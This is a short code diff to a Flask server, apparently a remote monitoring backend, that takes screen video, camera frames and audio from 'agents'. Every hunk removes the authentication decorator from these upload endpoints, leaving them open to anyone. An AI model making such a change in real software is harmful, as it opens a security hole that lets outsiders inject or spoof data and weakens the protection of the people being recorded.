@@ -1731,7 +1731,6 @@ CAMERA_FRAMES = defaultdict(lambda: None)
 AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 
 @app.route('/stream/<agent_id>', methods=['POST'])
-@require_auth
 def stream_in(agent_id):
     VIDEO_FRAMES[agent_id] = request.data
     return "OK", 200
@@ -1751,7 +1750,6 @@ def video_feed(agent_id):
     return Response(generate_video_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route('/camera/<agent_id>', methods=['POST'])
-@require_auth
 def camera_in(agent_id):
     CAMERA_FRAMES[agent_id] = request.data
     return "OK", 200
@@ -1771,7 +1769,6 @@ def camera_feed(agent_id):
     return Response(generate_camera_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route('/audio/<agent_id>', methods=['POST'])
-@require_auth
 def audio_in(agent_id):
     AUDIO_CHUNKS[agent_id].put(request.data)
     return "OK", 200
